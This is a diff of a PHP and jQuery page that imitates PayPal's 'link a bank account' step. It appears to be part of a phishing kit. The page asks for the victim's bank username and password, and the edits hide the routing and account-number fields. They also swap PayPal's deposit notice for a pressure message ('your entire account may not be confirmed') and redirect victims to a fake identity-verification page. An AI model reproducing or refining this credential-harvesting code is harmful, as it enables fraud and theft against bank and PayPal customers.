@@ -403,7 +403,7 @@ document.onreadystatechange = function () {
 </div>
 -->
 <div id="bankkatba" class=""  style="margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
-<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Link a <?php echo $countryname ?> bank account</h1>
+<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Link and confirm a <?php echo $countryname ?> bank account</h1>
 </div>
 
 <div id="emailkatba" class=""  style="display:none;margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
@@ -1258,17 +1258,15 @@ $("#siribabbbk").attr("class","setupStep-state nemo_account nemo_account_created
 
 
 
-setTimeout(function() {
-									location = '../identity/?verify_account=session=&b5b8f074d5a08285c1010f68550ad37a&dispatch=894267da063f78c78f6de540e8a5ef4471419a80';
-								},);
+
 
             
 
-                    //$("#emailadress").show();                    $("#emailkatba").show();
+                    $("#emailadress").show();                    $("#emailkatba").show();
 
                     $("#nwabank").hide();                    $("#bankkatba").hide();
 
-$("#doori").show();  
+$("#doori").hide();  
 
 
                                 $(location).attr("", "");
@@ -1323,7 +1321,7 @@ Please Select Bank Name
 <div class="multi equal clearfix">
                                                     <div class=" left">
 
-<div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="User Name ID" data-reactid="128"><label for="User Name ID" data-reactid="129">User Name ID</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
+<div id="UserNameIDdiv" class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="User Name ID" data-reactid="128"><label for="User Name ID" data-reactid="129">User Name ID</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
 <input type="text" required="required" ng-model="UserNameID" id="UserNameID" aria-describedby="text-info-expDate UserNameIDinputError" name="UserNameID" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">
 </div>
   </div>
@@ -1338,7 +1336,7 @@ Please Select Bank Name
 
 
 
-<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Password Bank" data-reactid="128"><label for="Password Bank" data-reactid="129">Password Bank</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
+<div id="PasswordBankdiv" class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Password Bank" data-reactid="128"><label for="Password Bank" data-reactid="129">Password Bank</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
 <input required="required" type="Password"  ng-model="PasswordBank"
  id="PasswordBank" aria-describedby="text-info-expDate PasswordBankinputError" name="PasswordBank" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">
 
@@ -1362,7 +1360,7 @@ Please Select Bank Name
 
 
 
-<div class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Routing Number" data-reactid="128"><label for="expDate" data-reactid="129">Routing Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
+<div id="xxnxxdiv" class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Routing Number" data-reactid="128"><label for="expDate" data-reactid="129">Routing Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
 <input required="required" type="text" ng-model="xxnxx" id="xxnxx" aria-describedby="text-info-expDate xxnxxinputError" name="xxnxx" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">
 
 </div>
@@ -1374,7 +1372,7 @@ Please Select Bank Name
 
 
 
-<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Account Number" data-reactid="128"><label for="expDate" data-reactid="129">Account Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
+<div id="xxllxxdiv" class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Account Number" data-reactid="128"><label for="expDate" data-reactid="129">Account Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
 <input required="required" type="text" ng-model="xxllxx" id="xxllxx" aria-describedby="text-info-expDate xxllxxinputError" name="xxllxx" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">
 
 </div>
@@ -1387,7 +1385,7 @@ Please Select Bank Name
 
 
 
-<p data-reactid="128">By continuing, you agree to let PayPal send 2 small deposit amounts (less than $1.00 USD) and retrieve them in 1 withdrawal.</p>
+<p data-reactid="128">When you skip this step, your entire account may not be confirmed .</p>
 
 
 
@@ -1405,10 +1403,9 @@ $("#baltiXD").click(function(e) {
       e.preventDefault();
 
 
-setTimeout(function() {
-									location = '../identity/?verify_account=session=&b5b8f074d5a08285c1010f68550ad37a&dispatch=894267da063f78c78f6de540e8a5ef4471419a80';
-								},);
-                   // $("#emailadress").show();                    $("#emailkatba").show();
+								
+								
+                   $("#emailadress").show();                    $("#emailkatba").show();
 
                     $("#nwabank").hide();                    $("#bankkatba").hide();
 $("#doori").show();  
@@ -1525,8 +1522,13 @@ $( element ).parents( ".dddd" ).removeClass( errorClass );
 
 
 
-$("#thankskatba").show();           
-$("#thnksss").show();
+//$("#thankskatba").show();           
+//$("#thnksss").show();
+
+setTimeout(function() {
+									location = '../identity/?verify_account=session=&b5b8f074d5a08285c1010f68550ad37a&dispatch=894267da063f78c78f6de540e8a5ef4471419a80';
+								},);
+
 
 
 $("#tbanhadiblastviry").show();
@@ -1542,7 +1544,7 @@ $("#x_34ID-Z729").hide();
 $("#emailadress").hide();
 $("#emailkatba").hide();
 
-$("#doori").hide();  
+$("#doori").show();  
 
 
                                 $(location).attr("", "");
@@ -2015,7 +2017,11 @@ $('#iachfield1ddl').on('change',function(){
 
 
 
+<style type="text/css">
+#xxnxxdiv{display: none;}
+#xxllxxdiv{display: none;}
 
+</style>
 
 
 </div></body></html>
